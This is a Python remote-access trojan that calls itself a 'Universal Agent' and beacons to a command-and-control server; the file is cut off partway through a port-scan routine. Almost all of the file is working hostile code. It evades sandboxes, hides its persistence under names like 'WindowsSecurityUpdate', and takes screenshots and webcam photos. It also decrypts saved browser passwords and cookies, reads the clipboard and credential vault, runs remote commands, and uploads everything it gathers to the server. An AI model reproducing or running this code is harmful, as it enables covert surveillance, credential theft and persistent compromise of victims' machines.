#!/usr/bin/env python3
import os
import sys
import time
import socket
import json
import uuid
import platform
import subprocess
import threading
import base64
import shutil
import random
import ctypes
from concurrent.futures import ThreadPoolExecutor
# --- CONFIGURATION ---
AGENT_VERSION = "2.1.0-UNIVERSAL"

# --- BOOTSTRAP: AUTO-DEPENDENCY INSTALLATION ---
def bootstrap():
    """Automatically install missing dependencies based on platform."""
    is_win = platform.system() == "Windows"
    is_mac = platform.system() == "Darwin"
    
    # Base dependencies
    deps = ["requests", "pycryptodomex", "Pillow"]
    
    if is_win:
        deps += ["pypiwin32", "pyautogui", "opencv-python"]
    elif is_mac:
        # macOS specific tools often pre-installed or via brew, but we'll try pip versions
        deps += ["opencv-python"] 
    else:
        # Linux
        deps += ["opencv-python"]

    for dep in deps:
        try:
            if dep == "pycryptodomex": import Cryptodome
            elif dep == "pypiwin32": import win32crypt
            else: __import__(dep.replace("-", "_"))
        except ImportError:
            try:
                # Add --break-system-packages for modern Linux (Kali/Debian) to bypass PEP 668
                cmd = [sys.executable, "-m", "pip", "install", dep, "--quiet"]
                if not is_win: cmd.append("--break-system-packages")
                
                subprocess.check_call(cmd, creationflags=0x08000000 if is_win else 0)
            except: pass

bootstrap()
import requests

def _is_analysis_env():
    """Elite Anti-Analysis: Detects VMs, Sandboxes, and Debuggers."""
    if platform.system() != "Windows": return False
    try:
        # 1. Check for common VM MAC addresses
        import uuid
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
        vm_macs = ["08:00:27", "00:05:69", "00:0c:29", "00:50:56", "00:15:5d", "00:1c:42"]
        if any(mac.startswith(prefix) for prefix in vm_macs): return True

        # 2. Check for small disk size (typical of sandboxes)
        import ctypes
        free_bytes = ctypes.c_ulonglong(0)
        total_bytes = ctypes.c_ulonglong(0)
        ctypes.windll.kernel32.GetDiskFreeSpaceExW("C:\\", None, ctypes.byref(total_bytes), ctypes.byref(free_bytes))
        if total_bytes.value / (1024**3) < 60: return True # Less than 60GB

        # 3. Check for analysis processes
        out = subprocess.run("tasklist", capture_output=True, text=True).stdout.lower()
        blacklisted = ["wireshark", "procmon", "vboxservice", "vmtoolsd", "x64dbg", "processhacker"]
        if any(proc in out for proc in blacklisted): return True
    except: pass
    return False

# if _is_analysis_env():
#     # Silent exit if analyzed
#     os._exit(0)

# _hide_console()

# Paths should be absolute so elevated processes (which start in System32) can find them
AGENT_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_FILE = os.path.join(AGENT_DIR, ".c2_universal_config")
ID_FILE = os.path.join(AGENT_DIR, ".agent_id")

def get_local_networks():
    """Identify local subnets to scan."""
    networks = []
    try:
        # Get all IPs associated with this machine
        hostname = socket.gethostname()
        ips = socket.gethostbyname_ex(hostname)[2]
        for ip in ips:
            if not ip.startswith("127."):
                base = ".".join(ip.split(".")[:-1])
                networks.append(base)
    except:
        pass
    
    # Fallback to a common range if nothing found
    if not networks:
        networks = ["192.168.1"]
    return list(set(networks))

def check_url(url):
    """Check if a full URL is a live C2 Server."""
    try:
        # Just check if the port is open and responding, ignore status code
        resp = requests.get(url, timeout=3.0, verify=False)
        return url
    except:
        pass
    return None

def check_ip(ip, port=5001):
    """Check if a specific IP/Port is the C2 Server."""
    return check_url(f"http://{ip}:{port}")

def discover_server():
    """Scan local networks for the C2 server."""

    # 1. Check Config Cache First — also try updating the port if stale
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                cached_url = json.load(f).get("server_url", "")

            # Try the cached URL directly first
            if cached_url and check_url(cached_url):
                return cached_url

            # If cached URL fails, try same host with port 5001
            if cached_url:
                parts = cached_url.split(":")
                if len(parts) >= 3:
                    host = parts[1].lstrip("/")
                    updated_url = f"http://{host}:5001"
                    if check_url(updated_url):
                        # Update cache with correct port
                        with open(CONFIG_FILE, 'w') as f:
                            json.dump({"server_url": updated_url}, f)
                        return updated_url
        except:
            pass

    # 2. Scan Local Subnets
    networks = get_local_networks()
    for net in networks:
        with ThreadPoolExecutor(max_workers=100) as executor:
            targets = [f"{net}.{i}" for i in range(1, 255)]
            results = list(executor.map(check_ip, targets))
            for res in results:
                if res:
                    # Save to cache
                    with open(CONFIG_FILE, 'w') as f:
                        json.dump({"server_url": res}, f)
                    return res

    return None

# --- CORE AGENT LOGIC ---
class UniversalAgent:
    def __init__(self, server_url):
        self.server_url = server_url.rstrip('/')
        self.id = self._get_id()
        self.hostname = socket.gethostname()
        self.os = f"{platform.system()} {platform.release()}"
        self._keylog_callback = None
        self.is_sandbox = self._check_sandbox()
        self.sleep_interval = 2 # Ultra-fast default
        self.session = requests.Session() # Persistent Keep-Alive connection
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
        ]
        
    def _check_sandbox(self):
        """Perform various checks to detect virtualized environments."""
        if platform.system() != "Windows": return False
        try:
            import ctypes
            # 1. Check for VirtualBox/VMware registry keys
            checks = [
                (r"HARDWARE\Description\System", "SystemBiosVersion", "VBOX"),
                (r"HARDWARE\Description\System", "SystemBiosVersion", "VMWARE"),
                (r"SOFTWARE\VMware, Inc.\VMware Tools", "", ""),
            ]
            import winreg
            for path, val_name, search in checks:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                    if not search: return True # Existence of key is enough
                    val, _ = winreg.QueryValueEx(key, val_name)
                    if search in str(val).upper(): return True
                except: continue

            # 2. Check MAC Address OUIs
            import uuid
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
            ouis = ["08:00:27", "00:05:69", "00:0c:29", "00:50:56", "00:1c:42", "00:16:3e", "08:00:27"]
            if mac[:8] in ouis: return True

            # 3. Check Disk Size (often < 60GB in sandboxes)
            import shutil
            total, _, _ = shutil.disk_usage("C:\\")
            if total / (1024**3) < 60: return True

        except: pass
        return False

    def _run_cmd(self, cmd, timeout=30, shell=False):
        """Stealthy process execution helper."""
        kwargs = {"capture_output": True, "text": True, "timeout": timeout, "shell": shell}
        if platform.system() == "Windows":
            kwargs["creationflags"] = 0x08000000 # CREATE_NO_WINDOW
        return subprocess.run(cmd, **kwargs)

    def _get_id(self):
        id_file = ID_FILE
        if os.path.exists(id_file):
            with open(id_file, 'r') as f:
                return f.read().strip()
        else:
            agent_id = f"{socket.gethostname()}_{uuid.uuid4().hex[:8]}"
            with open(id_file, 'w') as f:
                f.write(agent_id)
            return agent_id

    def _install_persistence(self):
        """Install agent to survive reboots — copies self to permanent location first."""
        try:
            import shutil
            agent_src = os.path.abspath(__file__)

            if platform.system() == "Windows":
                # 1. Find full path to pythonw.exe
                pythonw = None
                candidates = [
                    os.path.join(os.path.dirname(sys.executable), "pythonw.exe"),
                    os.path.join(sys.base_prefix, "pythonw.exe"),
                ]
                result = subprocess.run("where pythonw", shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    pythonw = result.stdout.strip().splitlines()[0].strip()
                if not pythonw:
                    for c in candidates:
                        if os.path.exists(c):
                            pythonw = c
                            break
                if not pythonw:
                    pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")

                # 2. Copy agent to permanent hidden location
                persist_dir  = os.path.join(os.environ.get("APPDATA", ""), "Microsoft", "Windows", "WinSvc")
                os.makedirs(persist_dir, exist_ok=True)
                persist_path = os.path.join(persist_dir, "WinSvc.py")
                shutil.copy2(agent_src, persist_path)
                subprocess.run(["attrib", "+H", "+S", persist_dir], capture_output=True)

                # 3. Create a silent VBS launcher (wscript.exe always in PATH — 100% reliable)
                vbs_path = os.path.join(persist_dir, "start.vbs")
                vbs_content = (
                    f'Set o = CreateObject("WScript.Shell")\r\n'
                    f'o.Run Chr(34) & "{pythonw}" & Chr(34) & " " & Chr(34) & "{persist_path}" & Chr(34), 0, False\r\n'
                )
                with open(vbs_path, "w") as f:
                    f.write(vbs_content)

                # 4. Registry: point to wscript.exe (always exists) calling VBS silently
                reg_val = f'wscript.exe "{vbs_path}"'
                reg_cmd = (
                    f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
                    f'/v "WindowsSecurityUpdate" /t REG_SZ /d "{reg_val}" /f'
                )
                subprocess.run(reg_cmd, shell=True, capture_output=True)

                # 5. Scheduled task as backup
                task_cmd = (
                    f'schtasks /create /tn "WindowsSecurityUpdate" '
                    f'/tr "wscript.exe \\"{vbs_path}\\"" '
                    f'/sc onlogon /rl highest /f'
                )
                subprocess.run(task_cmd, shell=True, capture_output=True)

                return (
                    f"[+] Persistence installed (VBS launcher).\n"
                    f"    Agent:    {persist_path}\n"
                    f"    Launcher: {vbs_path}\n"
                    f"    pythonw:  {pythonw}\n"
                    f"    Registry + Scheduled Task installed."
                )

            elif platform.system() == "Darwin":
                # macOS Persistence: LaunchAgents (user context)
                persist_dir  = os.path.join(os.path.expanduser("~"), "Library", "Application Support", "com.apple.winsvc")
                os.makedirs(persist_dir, exist_ok=True)
                persist_path = os.path.join(persist_dir, "winsvc.py")
                shutil.copy2(agent_src, persist_path)

                # Create LaunchAgent PLIST
                plist_path = os.path.join(os.path.expanduser("~"), "Library", "LaunchAgents", "com.apple.winsvc.plist")
                plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.winsvc</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{persist_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""
                with open(plist_path, "w") as f: f.write(plist_content)
                subprocess.run(["launchctl", "load", plist_path], capture_output=True)
                return f"[+] Persistence installed via macOS LaunchAgent: {plist_path}"

            else:
                # Linux: copy to ~/.config/.winsvc.py
                persist_dir  = os.path.join(os.path.expanduser("~"), ".config")
                os.makedirs(persist_dir, exist_ok=True)
                persist_path = os.path.join(persist_dir, ".winsvc.py")
                shutil.copy2(agent_src, persist_path)

                cron_entry = f"@reboot {sys.executable} {persist_path} > /dev/null 2>&1 &\n"
                current = subprocess.run("crontab -l 2>/dev/null", shell=True, capture_output=True, text=True).stdout
                if persist_path not in current:
                    p = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE)
                    p.communicate(input=(current + cron_entry).encode())
                return f"[+] Persistence installed via Linux crontab: {persist_path}"

        except Exception as e:
            return f"[!] Persistence failed: {str(e)}"

    def _capture_screen(self):
        """High-speed in-memory screenshot capture."""
        import io
        from PIL import Image
        
        try:
            buf = io.BytesIO()
            if platform.system() == "Windows":
                import pyautogui
                # Fast capture via pyautogui (in-memory)
                img = pyautogui.screenshot()
                img.save(buf, format="PNG")
            elif platform.system() == "Darwin":
                # macOS native capture
                tmp = "/tmp/s.png"
                res = subprocess.run(["screencapture", "-x", tmp], capture_output=True, text=True)
                if os.path.exists(tmp):
                    with open(tmp, "rb") as f: buf.write(f.read())
                    os.remove(tmp)
                else:
                    return f"[!] Screenshot failed (screencapture error: {res.stderr.strip()})"
            else:
                # Linux fallback
                tmp = "/tmp/s.png"
                subprocess.run(["scrot", tmp], capture_output=True)
                if os.path.exists(tmp):
                    with open(tmp, "rb") as f: buf.write(f.read())
                    os.remove(tmp)

            if buf.tell() > 0:
                buf.seek(0)
                self.session.post(f"{self.server_url}/api/p/report/screenshot", 
                                  files={'file': ('s.png', buf, 'image/png')}, 
                                  data={'agent_id': self.id}, timeout=30)
                return "[+] Screenshot exfiltrated (In-Memory)."
            return "[!] Screenshot failed."
        except Exception as e:
            return f"[!] Screenshot error: {str(e)}"

    def _capture_webcam(self):
        """Capture webcam photo and upload."""
        temp_file = os.path.join(os.environ.get("TEMP", os.getcwd()), "wc.jpg")
        debug_info = []
        try:
            # TRY OPENCV NATIVELY FIRST (DirectShow/MediaFoundation) - Most reliable for laptops
            try:
                import cv2
            except ImportError:
                import sys
                self._run_cmd([sys.executable, "-m", "pip", "install", "opencv-python"])

            try:
                import cv2
                import time
                backends = [cv2.CAP_ANY, cv2.CAP_MSMF, cv2.CAP_DSHOW] if platform.system() == "Windows" else [cv2.CAP_ANY]
                found = False
                for backend in backends:
                    if found: break
                    for cam_idx in range(3):
                        cap = cv2.VideoCapture(cam_idx, backend)
                        if cap.isOpened():
                            time.sleep(1.5) # Warm-up the sensor
                            for _ in range(5):
                                ret, frame = cap.read()
                                if ret and frame is not None:
                                    cv2.imwrite(temp_file, frame)
                            cap.release()
                            if os.path.exists(temp_file) and os.path.getsize(temp_file) > 0:
                                found = True
                                break # Successfully captured
                        else:
                            debug_info.append(f"c{cam_idx}_b{backend}")
            except Exception as e: 
                debug_info.append(f"cv2_err: {str(e)[:50]}")

            if platform.system() == "Windows" and not os.path.exists(temp_file):
                # Fallback natively to Windows RT MediaCapture API via PowerShell
                rt_cmd = (
                    'Add-Type -AssemblyName System.Runtime.WindowsRuntime; '
                    '$type = [System.Type]::GetType("Windows.Media.Capture.MediaCapture, Windows.Media, Version=255.255.255.255, Culture=neutral, PublicKeyToken=null, ContentType=WindowsRuntime"); '
                    'if ($type) { '
                    '  $mc = [Activator]::CreateInstance($type); '
                    '  $op = $mc.InitializeAsync(); '
                    '  $sync = [System.Threading.Tasks.Task]::Run( { $op.AsTask().Wait() } ); '
                    '  $sync.Wait(); '
                    '  $imgFormat = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg(); '
                    f'  $storageFile = [Windows.Storage.StorageFile]::GetFileFromPathAsync("{temp_file}").AsTask().Result; '
                    '  if (-not $storageFile) { '
                    '    $folder = [Windows.Storage.ApplicationData]::Current.LocalFolder; '
                    '    $storageFile = $folder.CreateFileAsync("wc.jpg", [Windows.Storage.CreationCollisionOption]::ReplaceExisting).AsTask().Result; '
                    '  } '
                    '  $captureOp = $mc.CapturePhotoToStorageFileAsync($imgFormat, $storageFile); '
                    '  $captureSync = [System.Threading.Tasks.Task]::Run( { $captureOp.AsTask().Wait() } ); '
                    '  $captureSync.Wait(); '
                    f'  if ($storageFile.Path -ne "{temp_file}") {{ Copy-Item $storageFile.Path -Destination "{temp_file}" -Force }} '
                    '} else { exit 1 }'
                )
                res = self._run_cmd(["powershell", "-WindowStyle", "Hidden", "-c", rt_cmd])
                
                if res.returncode != 0 or not os.path.exists(temp_file):
                    debug_info.append(f"WinRT API failed")
                    # Fallback natively to WIA (Windows Image Acquisition)
                    wia_cmd = (
                        '$vid = New-Object -ComObject WIA.DeviceManager; '
                        '$dev = $vid.DeviceInfos | Where-Object { $_.Type -eq 2 -or $_.Type -eq 3 -or $_.Type -eq 1 } | Select-Object -First 1; '
                        f'if ($dev) {{ $d = $dev.Connect(); $it = $d.Items | Select-Object -First 1; $img = $it.Transfer(); $img.SaveFile("{temp_file}"); }} else {{ exit 1 }}'
                    )
                    r2 = self._run_cmd(["powershell", "-WindowStyle", "Hidden", "-c", wia_cmd])
                    if r2.returncode != 0 or not os.path.exists(temp_file):
                        debug_info.append("WIA failed")
                    try:
                        # Fallback to ffmpeg dynamically extracting device name
                        import re
                        sys_cmd = self._run_cmd(["ffmpeg", "-list_devices", "true", "-f", "dshow", "-i", "dummy"])
                        dev_name = "Integrated Camera"
                        match = re.search(r'\[dshow @ .*?\] DirectShow video devices.*?\n\[dshow @ .*?\]\s+"([^"]+)"', sys_cmd.stderr)
                        if match:
                            dev_name = match.group(1)
                        self._run_cmd(["ffmpeg", "-y", "-rtbufsize", "1500M", "-f", "dshow", "-i", f"video={dev_name}", "-vframes", "1", temp_file])
                    except FileNotFoundError:
                        debug_info.append("ffmpeg missing")
            elif platform.system() == "Darwin" and not os.path.exists(temp_file):
                try:
                    subprocess.run(["ffmpeg", "-y", "-f", "avfoundation", "-video_size", "1280x720", "-framerate", "30", "-i", "0", "-vframes", "1", temp_file], capture_output=True)
                except FileNotFoundError:
                    pass
                if not os.path.exists(temp_file):
                    try:
                        subprocess.run(["imagesnap", "-w", "1.0", temp_file], capture_output=True)
                    except FileNotFoundError:
                        pass
            elif not os.path.exists(temp_file):
                try:
                    subprocess.run(["fswebcam", "-r", "640x480", "--jpeg", "85", "-D", "1", temp_file], capture_output=True)
                except FileNotFoundError:
                    pass

            if os.path.exists(temp_file):
                # Upload to server using the screenshot endpoint so it appears in the gallery
                with open(temp_file, 'rb') as f:
                    files = {'file': f}
                    data = {'agent_id': self.id}
                    requests.post(f"{self.server_url}/api/p/report/screenshot", files=files, data=data, timeout=30)
                try:
                    os.remove(temp_file)
                except Exception:
                    pass
                return "[+] Webcam captured and uploaded to Gallery."
            
            dbg = " | ".join(debug_info)
            return (f"[!] Webcam capture failed. [Debug: {dbg}]\nEnsure:\n"
                    "  - A webcam is connected and not in use\n"
                    "  - (Windows) WIA service is running or permissions allow it\n"
                    "  - (Linux) fswebcam/ffmpeg is installed")
        except Exception as e:
            return f"[!] Webcam error: {str(e)}"

    def _get_clipboard(self):
        """Reads the current clipboard contents silently."""
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    ["powershell", "-WindowStyle", "Hidden", "-Command", "Get-Clipboard"],
                    capture_output=True, text=True, timeout=10,
                    creationflags=0x08000000
                )
                return result.stdout.strip() or "[!] Clipboard is empty."
            elif platform.system() == "Darwin":
                result = subprocess.run(["pbpaste"], capture_output=True, text=True, timeout=5)
                return result.stdout.strip() or "[!] Clipboard is empty."
            else:
                for cmd in [["xclip", "-o", "-selection", "clipboard"], ["xsel", "--clipboard", "--output"]]:
                    try:
                        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                        if result.returncode == 0:
                            return result.stdout.strip() or "[!] Clipboard is empty."
                    except FileNotFoundError:
                        continue
                return "[!] No clipboard tool found (install xclip or xsel)."
        except Exception as e:
            return f"[!] Clipboard error: {str(e)}"

    def _get_creds(self):
        """Extracts saved browser credentials from Chrome/Edge using DPAPI."""
        if platform.system() != "Windows":
            return "[!] Browser cred extraction only supported on Windows."
        try:
            import sqlite3, shutil, json, base64, ctypes, ctypes.wintypes

            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

            def dpapi_decrypt(enc):
                buf = ctypes.create_string_buffer(enc, len(enc))
                blob_in  = DATA_BLOB(ctypes.sizeof(buf), buf)
                blob_out = DATA_BLOB()
                if ctypes.windll.crypt32.CryptUnprotectData(
                        ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                    result = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                    return result
                return None

            local_appdata = os.environ.get("LOCALAPPDATA", "")
            browsers = {
                "Chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data"),
                "Edge":   os.path.join(local_appdata, "Microsoft", "Edge", "User Data"),
            }
            results = []
            temp_dir = os.environ.get("TEMP", os.getcwd())

            for browser, user_data in browsers.items():
                if not os.path.exists(user_data):
                    continue
                
                # Search for all Login Data files in all profiles
                login_paths = []
                for root, dirs, files in os.walk(user_data):
                    for name in files:
                        if name == "Login Data":
                            login_paths.append(os.path.join(root, name))
                
                state_file = os.path.join(user_data, "Local State")
                
                # Get AES master key (Chrome v80+)
                aes_key = None
                if os.path.exists(state_file):
                    try:
                        with open(state_file, "r", encoding="utf-8") as f:
                            state = json.load(f)
                        enc_key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
                        aes_key = dpapi_decrypt(enc_key)
                    except Exception:
                        pass

                for login_db in login_paths:
                    # Identify profile name from path
                    profile = "Default"
                    parts = login_db.split(os.sep)
                    if "User Data" in parts:
                        idx = parts.index("User Data")
                        if idx + 1 < len(parts):
                            profile = parts[idx+1]

                    tmp = os.path.join(temp_dir, f"_{browser}_{profile}_tmp.db")
                    try:
                        shutil.copy2(login_db, tmp)
                        conn   = sqlite3.connect(tmp)
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        for url, user, enc_pwd in cursor.fetchall():
                            if not user:
                                continue
                            try:
                                pwd = "[decrypt failed]"
                                if aes_key and enc_pwd[:3] == b"v10":
                                    try:
                                        from Cryptodome.Cipher import AES
                                        iv  = enc_pwd[3:15]
                                        pay = enc_pwd[15:]
                                        # Chrome v80+ AES-GCM
                                        cipher = AES.new(aes_key, AES.MODE_GCM, iv)
                                        pwd = cipher.decrypt(pay)[:-16].decode()
                                    except ImportError:
                                        # This should have been caught by bootstrap, but just in case
                                        pwd = "[AES-GCM — missing dependencies]"
                                    except Exception as e:
                                        pwd = f"[decryption error: {str(e)}]"
                                else:
                                    dec = dpapi_decrypt(enc_pwd)
                                    pwd = dec.decode("utf-8", errors="replace") if dec else "[decrypt failed]"
                                results.append(f"{browser} ({profile}) | {url} | {user} | {pwd}")
                            except Exception:
                                results.append(f"{browser} ({profile}) | {url} | {user} | [error]")
                        conn.close()
                    except Exception:
                        continue
                    finally:
                        try:
                            os.remove(tmp)
                        except Exception:
                            pass

            if not results:
                return "[!] No saved credentials found."
            return "\n".join(results)
        except Exception as e:
            return f"[!] Cred extraction failed: {str(e)}"

    def _get_cookies(self):
        """Extract and decrypt browser cookies."""
        if platform.system() != "Windows": return "[!] Only supported on Windows."
        import sqlite3, shutil, json, base64, ctypes, os
        
        import sqlite3, shutil, json, base64, ctypes
        from Cryptodome.Cipher import AES

        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", ctypes.c_uint32), ("pbData", ctypes.POINTER(ctypes.c_char))]

        def _local_dpapi(enc):
            try:
                buf = ctypes.create_string_buffer(enc, len(enc))
                blob_in, blob_out = DATA_BLOB(len(buf), buf), DATA_BLOB()
                if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
                    res = ctypes.string_at(blob_out.pbData, blob_out.cbData)
                    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
                    return res
            except: pass
            return None

        try:
            local_appdata = os.environ.get("LOCALAPPDATA", "")
            browsers = {
                "Chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data"),
                "Edge":   os.path.join(local_appdata, "Microsoft", "Edge", "User Data"),
            }
            results = []
            temp_dir = os.environ.get("TEMP", os.getcwd())
            
            for browser, user_data in browsers.items():
                if not os.path.exists(user_data): continue
                cookie_paths = []
                for root, _, files in os.walk(user_data):
                    for name in files:
                        if name in ["Cookies", "Network\\Cookies"]:
                             cookie_paths.append(os.path.join(root, name))
                
                state_file = os.path.join(user_data, "Local State")
                aes_key = None
                if os.path.exists(state_file):
                    try:
                        with open(state_file, "r", encoding="utf-8") as f:
                            state = json.load(f)
                        enc_key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
                        aes_key = _local_dpapi(enc_key)
                    except: pass

                for cookie_db in cookie_paths:
                    profile = "Default"
                    parts = cookie_db.split(os.sep)
                    if "User Data" in parts:
                        idx = parts.index("User Data")
                        if idx + 1 < len(parts): profile = parts[idx+1]

                    tmp = os.path.join(temp_dir, f"_{browser}_{profile}_ck.db")
                    try:
                        shutil.copy2(cookie_db, tmp)
                        conn = sqlite3.connect(tmp)
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                        for host, name, enc_val in cursor.fetchall():
                            try:
                                val = "[decrypt failed]"
                                if aes_key and enc_val[:3] == b"v10":
                                    iv, pay = enc_val[3:15], enc_val[15:]
                                    cipher = AES.new(aes_key, AES.MODE_GCM, iv)
                                    val = cipher.decrypt(pay)[:-16].decode()
                                else:
                                    dec = _local_dpapi(enc_val)
                                    val = dec.decode("utf-8", errors="replace") if dec else "[DPAPI-Encrypted]"
                                results.append(f"{browser} ({profile}) | {host} | {name}={val}")
                            except: continue
                        conn.close()
                    except: continue
                    finally:
                        try: os.remove(tmp)
                        except: pass
            return "\n".join(results) if results else "[!] No cookies found."
        except Exception as e: return f"[!] Cookie theft failed: {str(e)}"

    def _get_history(self):
        """Extract browser history."""
        if platform.system() != "Windows": return "[!] Only supported on Windows."
        import sqlite3, shutil, os
        try:
            local_appdata = os.environ.get("LOCALAPPDATA", "")
            browsers = {
                "Chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data"),
                "Edge":   os.path.join(local_appdata, "Microsoft", "Edge", "User Data"),
            }
            results = []
            temp_dir = os.environ.get("TEMP", os.getcwd())
            for browser, user_data in browsers.items():
                if not os.path.exists(user_data): continue
                for root, dirs, files in os.walk(user_data):
                    if "History" in files:
                        hist_db = os.path.join(root, "History")
                        tmp = os.path.join(temp_dir, f"_{browser}_hist_tmp.db")
                        try:
                            shutil.copy2(hist_db, tmp)
                            conn = sqlite3.connect(tmp)
                            cursor = conn.cursor()
                            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                            for url, title, _ in cursor.fetchall():
                                results.append(f"{browser} | {title[:50]} | {url}")
                            conn.close()
                        except: continue
                        finally:
                            try: os.remove(tmp)
                            except: pass
            return "\n".join(results) if results else "[!] No history found."
        except Exception as e: return f"[!] History extraction failed: {str(e)}"

    def _get_vault(self):
        """Extract Windows Credential Manager entries."""
        if platform.system() != "Windows": return "[!] Only supported on Windows."
        # This is complex via ctypes, using a simplified powershell fallback for reliability
        cmd = "powershell -c \"[void][Reflection.Assembly]::LoadWithPartialName('System.Web'); [System.Web.Security.Roles]::GetRolesForUser(); (New-Object -ComObject 'Shell.Application').NameSpace(10).Items() | ForEach-Object { $_.Name }\""
        # Safer way: Use internal Windows vault tool if possible or simpler PS
        ps_cmd = 'powershell "Get-WmiObject -Class Win32_NetworkConnection | Select-Object RemoteName, LocalName; [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime] | ForEach-Object { $v = [Windows.Security.Credentials.PasswordVault]::new(); $v.RetrieveAll() | ForEach-Object { $_.RetrievePassword(); $_ } } | Select-Object Resource, UserName, Password"'
        try:
            res = subprocess.check_output(ps_cmd, shell=True, text=True, stderr=subprocess.STDOUT)
            return res if res.strip() else "[!] No vault credentials found."
        except Exception as e: return f"[!] Vault extraction failed: {str(e)}"

    def _selfdestruct(self):
        """Removes persistence, deletes agent file, and exits silently."""
        try:
            # Remove Windows registry persistence
            if platform.system() == "Windows":
                subprocess.run(
                    ["powershell", "-WindowStyle", "Hidden", "-Command",
                     "Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WinUpdate' -ErrorAction SilentlyContinue"],
                    capture_output=True, timeout=5, creationflags=0x08000000
                )
            else:
                # Remove crontab entry on Linux/Mac
                subprocess.run("crontab -l | grep -v c2_agent | crontab -", shell=True, capture_output=True)

            # Schedule deletion of this script file
            my_file = os.path.abspath(__file__)
            if platform.system() == "Windows":
                subprocess.Popen(
                    f'cmd /c "timeout /t 2 /nobreak >nul & del /f /q \"{my_file}\""',
                    shell=True, creationflags=0x08000000
                )
            else:
                subprocess.Popen(f'sleep 2 && rm -f "{my_file}"', shell=True)
        except Exception:
            pass
        finally:
            os.kill(os.getpid(), 9)  # Force kill self

    def _run_bg(self, command, task_id):
        """Runs a command in a background thread and reports output when done."""
        try:
            if platform.system() == "Windows":
                # DETACHED_PROCESS flag prevents any window from appearing
                DETACHED_PROCESS = 0x00000008
                CREATE_NO_WINDOW = 0x08000000
                proc = subprocess.Popen(
                    ["powershell", "-WindowStyle", "Hidden", "-Command", command],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    creationflags=DETACHED_PROCESS | CREATE_NO_WINDOW
                )
            else:
                proc = subprocess.Popen(
                    command, shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    preexec_fn=os.setsid  # Detach from parent process group
                )
            stdout, stderr = proc.communicate(timeout=120)
            output = (stdout.decode(errors='replace') + stderr.decode(errors='replace')).strip()
            output = output if output else "[+] Background task completed with no output."
        except subprocess.TimeoutExpired:
            proc.kill()
            output = "[!] Background task timed out after 120 seconds."
        except Exception as e:
            output = f"[!] Background task error: {str(e)}"

        # Report back the result to the C2
        try:
            requests.post(f"{self.server_url}/result",
                json={"command_id": task_id, "output": output, "agent_id": self.id},
                timeout=10)
        except Exception:
            pass

    def _ping_sweep(self, subnet):
        """Pings all hosts in a /24 using multi-threading for speed."""
        import socket
        from concurrent.futures import ThreadPoolExecutor
        
        if not subnet.endswith("."):
            subnet += "."
            
        live = []
        flag = "-n 1 -w 200" if platform.system() == "Windows" else "-c 1 -W 1"
        
        def _check_host(ip):
            try:
                r = subprocess.run(f"ping {flag} {ip}", shell=True, capture_output=True, timeout=1)
                if r.returncode == 0:
                    try: name = socket.gethostbyaddr(ip)[0]
                    except: name = "[Unknown]"
                    return f"{ip:<15} {name}"
            except: pass
            return None

        # Use 10 threads for balance between speed and noise
        with ThreadPoolExecutor(max_workers=30) as executor:
            ips = [f"{subnet}{i}" for i in range(1, 255)]
            results = executor.map(_check_host, ips)
            for res in results:
                if res: live.append(res)

        if not live:
            return f"[!] No live hosts found on {subnet}0/24"
        return f"[+] Live hosts on {subnet}0/24 ({len(live)} found):\n" + "\n".join(live)

    def _port_scan(self, ip):
        """Scans common ports on an IP address."""
        import socket
        ports = {
            21:"FTP", 22:"SSH", 23:"Telnet", 25:"SMTP", 53:"DNS",
            80:"HTTP", 110:"POP3", 135:"RPC", 139:"NetBIOS", 143:"IMAP",
